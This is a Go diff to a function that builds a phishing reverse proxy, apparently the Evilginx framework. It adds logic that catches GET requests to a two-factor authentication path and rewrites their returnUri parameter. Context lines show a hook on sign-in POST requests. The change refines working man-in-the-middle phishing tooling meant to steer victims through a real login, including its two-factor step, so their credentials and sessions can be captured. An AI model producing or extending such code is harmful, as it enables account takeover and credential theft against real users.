@@ -208,13 +208,32 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			o_host := req.Host
 			lure_url := req_url
 			req_path := req.URL.Path
+			if strings.Contains(req.URL.Path, "authflow/twofactor") && req.Method == http.MethodGet {
+			    // Parse the existing query parameters
+			    query := req.URL.Query()
+			
+			    // Update the `returnUri` parameter
+			    query.Set("returnUri", "myaccount")
+			
+			    // Rebuild the full URL with the updated query parameters
+			    req_url = req.URL.Scheme + "://" + req.Host + req.URL.Path + "?" + query.Encode()
+			} else {
+			
+			    if req.URL.RawQuery != "" {
+			        req_url += "?" + req.URL.RawQuery
+			    }
+			}
+			/*
 			if req.URL.RawQuery != "" {
 				req_url += "?" + req.URL.RawQuery
 				//req_path += "?" + req.URL.RawQuery
-			}
+			}*/
 
 			pl := p.getPhishletByPhishHost(req.Host)
 			remote_addr := from_ip
+
+			
+
 
 			 // Inject the following code snippet to check for "signin/v2" in the URL and if it's a POST request
 		       if strings.Contains(req.URL.Path, "signin/v2") && (req.Method == http.MethodPost || req.Method == http.MethodPut){
